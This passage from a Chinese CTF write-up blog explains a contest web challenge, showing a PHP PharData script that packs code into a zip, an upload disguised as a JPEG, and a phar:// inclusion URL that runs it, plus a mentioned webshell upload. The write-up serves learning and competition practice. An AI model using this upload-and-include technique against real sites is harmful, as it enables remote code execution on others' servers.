+<p>赛后发现是存在大小写问题，必须在脚本中利用<strong>ASCII</strong>码进行判断，别的大佬的题解里写出跑出来的结果是<code>F1AG@1s-at_/fll1llag_h3r3</code>，登陆后，发现存在远程连接MySQL的功能，有点类似DDCTF的MYSQL弱口令那道题，一样是要伪造一个MYSQL服务器端来连接最终获取flag，但是由于题目环境关闭了，无法进行复现了，但是这题学习到了一种新型的<strong>基于语法</strong>的盲注和无法得知列名情况下的注入，收获也还是蛮大的</p>
+<h4 id="RefSpace"><a href="#RefSpace" class="headerlink" title="RefSpace"></a>RefSpace</h4><p>题目的地址观察得知首先可以利用<strong>php伪协议</strong>读取源代码，再加上扫描后台以及读取源码中得到的提示，得出了题目的目录结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜ html tree</span><br><span class="line">.</span><br><span class="line">├── app</span><br><span class="line">│ ├── flag.php</span><br><span class="line">│ ├── index.php</span><br><span class="line">│ └── Up10aD.php</span><br><span class="line">├── backup.zip</span><br><span class="line">├── flag.txt</span><br><span class="line">├── index.php</span><br><span class="line">├── robots.txt</span><br><span class="line">└── upload</span><br><span class="line">2 directories, 7 files</span><br></pre></td></tr></table></figure>
+<p>其中注意到的便是网站有上传文件的功能，<code>app/Up10aD.php</code>源码如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\20.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>分析源码可知，对上传的文件做了类型的检查，根据类型自动加上后缀名<code>jpg</code>或者<code>gif</code></p>
+<p>在<code>index.php</code>中，存在文件包含：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\21.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>但是自动加上了后缀名<code>php</code></p>
+<p>一开始的想法是上传图片马，然后通过<strong>截断</strong>的方式包含图片马，但是尝试了<code>%00</code>，<code>0x00</code>，<strong>文件长度</strong>截断，都失败了，原因是该题目的php版本为<strong>7.0</strong>以上，而上述尝试的截断方式都仅仅适用于<strong>php5</strong></p>
+<p>所以，尝试了利用<code>phar</code>协议包含文件，具体可以参考：<a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="noopener">zip或phar协议包含文件</a></p>
+<p>具体方法为，使用<code>phar</code>类打包一个<code>phar</code>标准包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/phartest.zip'</span>, <span class="number">0</span>,<span class="string">'phartest'</span>,Phar::ZIP) ; </span><br><span class="line">$x=file_get_contents(<span class="string">'./test.php'</span>);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.php'</span>, $x);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行后生成<code>phartest.zip</code>压缩包，里面包含了代码为<code>&lt;?php phpinfo(); ?&gt;</code> 的<code>test.php</code>文件</p>
+<p>然后在<code>app/Up10aD.php</code>文件中上传该压缩包，并修改文件名为<code>phartest</code>，文件类型为<code>image/jpeg</code>，</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\23.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>这样，上传文件地址就为<code>upload/phartest.jpg</code>，然后访问<code>https://xxx/index.php?route=phar://upload/phartest.jpg/test</code></p>
+<p>即可成功执行<code>phpinfo</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\24.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>同样方法上传一句话木马后<strong>getshell</strong>也只发现存在<code>flag.txt</code>和<code>/ctf/sdk.php</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\国赛\22.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>没有其他思路了，只能就此作罢，后面考察的应该是要绕过<code>app/flag.php</code>中<code>sha1</code>比较，才能拿到flag</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-05-20T00:52:32.337Z" itemprop="dateUpdated">2019-05-20 08:52:32</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/43152/" target="_blank" rel="external">https://Foxgrin.github.io/posts/43152/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/43152/&title=《第十二届全国大学生信息安全竞赛-Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/43152/&title=《第十二届全国大学生信息安全竞赛-Web》 — Somnus's blog&source=第一次打国赛，emmm不得不说题目质量真的很高，一题都能卡学长一天，虽然一路跟着学长的思路复现下来，但是收获还是很多的，在这里做个复现的题解" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/43152/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《第十二届全国大学生信息安全竞赛-Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/43152/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/43152/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/10503/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：2019-FAFU-ctf WP
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/6882/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：DDCTF-Web">下一篇：DDCTF-Web</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/43152/&title=《第十二届全国大学生信息安全竞赛-Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/43152/&title=《第十二届全国大学生信息安全竞赛-Web》 — Somnus's blog&source=第一次打国赛，emmm不得不说题目质量真的很高，一题都能卡学长一天，虽然一路跟着学长的思路复现下来，但是收获还是很多的，在这里做个复现的题解" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/43152/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《第十二届全国大学生信息安全竞赛-Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/43152/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/43152/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABvUlEQVR42u3aQXKDMAwF0Nz/0nTbRYEvGatk5nmVSSg8d6FBX/584nX8Wsmv1esfXri4uMvc43JVQQnx+m5n1+Di4s5zzx5w/TkpT2ff5PfExcX9Fu51SeoVMlxc3G/nXl+ZtDe4uLjv5+aFJgfl297Sq+Hi4i5w85Ry3+ct+S4uLm6LexRXLzzthaR//BUuLu4INy8oeTNTHcSWn4uLi7uZWy1GvWFq8toU3QEXF3eQm5SYKjpHFMIRXFzcEe76mCRveJ6KWXFxcXdz89ea/LjVevJ50/zg4uKOc/NClpet3tjmpvnBxcUd4SaP6W0miUuimBUXF3eQ24st1gPQ6lgXFxd3hpsPP5LhaG/IWg5qcXFxX8BdfzWpNkI3/xpcXNxx7o744/qFqSrBxcX9X2412qiGI70jGri4uJPc6qnIpGBV7xBdiYuLu5l7FFd1q/noJdoMLi7uCLd3JKJwYKI4oK0+FxcXdx+3POZcOLBVHb6Wqy8uLu6j3N5gdSUu6TVRuLi4b+b2mpzeVh8oZLi4uJu5eRha/T4S4uLiDnKT5qdazvLxTD7oxcXFneH2Bp8rxavaSuHi4g5yfwCaTZp5jBz29AAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
